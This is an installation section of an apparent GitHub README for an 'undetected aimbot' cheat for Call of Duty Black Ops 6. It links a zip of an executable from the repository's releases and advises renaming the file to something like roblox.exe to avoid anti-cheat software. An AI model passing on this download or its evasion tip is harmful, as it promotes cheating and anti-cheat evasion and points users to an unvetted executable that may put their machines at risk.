## Installation

1. [Download](https://github.com/codeder13/Call-of-duty-black-ops-6-Cod-bo-6-undetected-aimbot/releases/download/v1.1/Bo6Aim.zip) the executable file from the Releases tab on this GitHub page.

2. Rename the file to something random (e.g., roblox.exe) to stay a little more undetected by anti-cheat software.
